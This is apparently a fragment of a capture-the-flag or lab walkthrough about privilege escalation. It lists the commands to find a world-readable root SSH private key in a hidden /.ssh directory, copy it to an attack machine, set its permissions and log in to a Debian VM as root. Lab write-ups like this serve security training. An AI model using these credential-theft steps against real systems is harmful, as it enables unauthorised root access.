We found a hidden directory named .ssh .

2.Now view the content of .ssh folder

ls -la /.ssh

Got a file named root_key.
** It is world Readable **

3. Copy the content of root_key file and store it in a file of Attack Box's .ssh file.
4. Save the file as root_key
5. give necessary permissions to the file root_key

chmod 600 root_key

6.Now using the key to the Debian VM as the root account.
